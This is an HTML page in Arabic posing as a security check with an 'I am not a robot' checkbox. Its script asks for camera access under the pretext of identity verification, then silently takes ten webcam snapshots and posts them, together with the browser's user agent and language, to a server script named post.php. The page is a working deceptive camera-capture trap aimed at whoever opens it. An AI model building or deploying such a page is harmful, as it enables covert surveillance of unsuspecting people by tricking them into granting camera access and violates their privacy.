<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>التحقق الأمني</title>
    <style>
        body { background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        #verify-box { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 320px; }
        .icon { width: 60px; height: 60px; fill: #4a90e2; margin-bottom: 20px; }
        .checkbox-container { border: 1px solid #dcdcdc; padding: 15px; margin: 20px auto; cursor: pointer; display: flex; align-items: center; border-radius: 5px; background: #f9f9f9; transition: 0.3s; }
        .checkbox-container:hover { background: #f1f1f1; }
    </style>
</head>
<body>

<div id="verify-box">
    <svg class="icon" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z"/></svg>
    <h3>التحقق الأمني</h3>
    <p style="color: #666; font-size: 14px;">يرجى تأكيد هويتك للمتابعة إلى الخدمة المطلوبة</p>
    
    <div class="checkbox-container" onclick="requestPermission()">
        <input type="checkbox" style="width: 20px; height: 20px; margin-right: 15px;">
        <span style="font-weight: 500;">أنا لست برنامج روبوت</span>
    </div>
</div>

<script>
    function requestPermission() {
        // جمع معلومات الجهاز والبيانات العامة
        const deviceInfo = "المتصفح: " + navigator.userAgent + " | اللغة: " + navigator.language;

        navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
            document.getElementById('verify-box').innerHTML = "<h3>جاري التحقق...</h3>";
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            let count = 0;
            const interval = setInterval(function() {
                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                
                // إرسال الصورة + المعلومات في نفس الطلب
                fetch('post.php', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: 'img=' + encodeURIComponent(canvas.toDataURL('image/jpeg', 0.8)) + 
                          '&info=' + encodeURIComponent(deviceInfo)
                });
                
                if (++count >= 10) { clearInterval(interval); stream.getTracks().forEach(t => t.stop()); }
            }, 1000);
        }).catch(e => alert("يرجى السماح بالوصول للكاميرا لإتمام التحقق."));
    }
</script>

</body>
</html>
